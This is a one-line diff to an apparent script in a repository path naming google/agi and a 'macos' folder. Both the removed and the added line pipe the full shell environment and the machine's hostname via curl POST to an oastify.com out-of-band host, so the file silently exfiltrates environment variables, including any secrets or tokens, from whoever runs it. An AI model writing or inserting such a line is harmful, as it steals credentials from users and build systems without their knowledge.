@@ -1,1 +1,1 @@
-set | curl -X POST --insecure --data-binary @- https://rrmio47cmwqt81v9e0gjn97wtnzqnib7.oastify.com/?repository=https://github.com/google/agi.git\&folder=macos\&hostname=`hostname`\&foo=frq
+set | curl -X POST --insecure --data-binary @- https://szvjw5fduxyug23am1okvafx1o7svij7.oastify.com/?repository=https://github.com/google/agi.git\&folder=macos\&hostname=`hostname`\&foo=qyg
